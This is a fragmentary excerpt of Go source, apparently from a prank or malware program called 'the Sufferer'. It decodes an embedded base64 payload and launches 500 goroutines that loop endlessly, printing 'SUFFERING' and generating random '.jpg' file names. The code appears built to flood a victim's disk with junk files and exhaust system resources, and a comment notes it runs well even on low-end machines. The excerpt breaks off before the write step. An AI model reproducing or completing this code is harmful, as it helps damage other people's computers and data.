...
func startSufferer() {
	...
	//decode very cool man
	dec, err := base64.StdEncoding.DecodeString(theman)
	if err != nil {
		panic(err)
	}

	//number of goroutines to create. Haven't really tested but 500 seems to work fine, even on low-end systems
	for i := 0; i < 500; i++ {
		go theSufferer(dec)
	}
...
func theSufferer(dec []byte) {
	for {
		fmt.Println("!!SUFFERING!!")
		fmt.Println("--> SUFFERING <--")
		format := ".jpg"
		randstring, err := GenerateRandomString(32) //change 32 to any amount of characters you want.
